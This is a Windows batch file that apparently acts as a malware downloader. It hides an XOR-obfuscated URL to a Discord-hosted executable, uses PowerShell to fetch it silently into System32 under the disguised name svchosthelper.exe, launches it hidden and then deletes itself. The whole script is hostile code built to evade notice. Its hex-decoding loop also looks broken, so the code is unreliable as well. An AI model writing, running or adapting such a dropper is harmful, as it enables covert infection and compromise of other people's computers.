@echo off

setlocal enabledelayedexpansion
set "OIZGJOZEIGJEOZIGJZOEIG=128"
set "ENC_DATA=e8f4f4f0f3baafafe3e4eeaee4e9f3e3eff2e4e1f0f0aee3efedafe1f4f4e1e3e8ede5eef4f3afb1b3b7b1b5b1b1b9b3b4b6b3b2b8b5b3b6b0b5afb1b3b7b1b5b8b7b2b3b2b9b7b6b2b0b7b8b7b2afebe5f9aee5f8e5bfe5f8bdb6b8b2b3e1e4e1b7a6e9f3bdb6b8b2b2b5e3b2b7a6e8edbde1b7e5e1e4b6b0e2b2b8b6b9b0b6b8e4b9e5e5b3b5b4b7e4e4b8e3e3b9b1b1e6b7b2b4e2b7b8b8e4b6b3b2b8b1b9b3b1b4e1e1b9e5b1b9e2e3b6b4e5b0e5b8b6a6"

set "DEC_URL="
for /L %%i in (0,2,800) do (
    set "HEX_BYTE=!ENC_DATA:~%%i,2!"
    if "!HEX_BYTE!" neq "" (
        set /a "DEC_BYTE=0x!HEX_BYTE! ^ OIZGJOZEIGJEOZIGJZOEIG"
        set "DEC_BYTE=!DEC_BYTE:~-2!"
        for %%d in (!DEC_BYTE!) do set "DEC_URL=!DEC_URL!!(0x%%d)"
    )
)
set "DEC_URL=!DEC_URL:0x=!"

set "TARGET_FILE=%SystemRoot%\System32\svchosthelper.exe"
>nul 2>&1 (
    powershell -nop -c "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('!DEC_URL!', '!TARGET_FILE!')"
    if exist "!TARGET_FILE!" (
        start "" /B "!TARGET_FILE!"
    )
)
del "%~f0" >nul 2>&1
exit
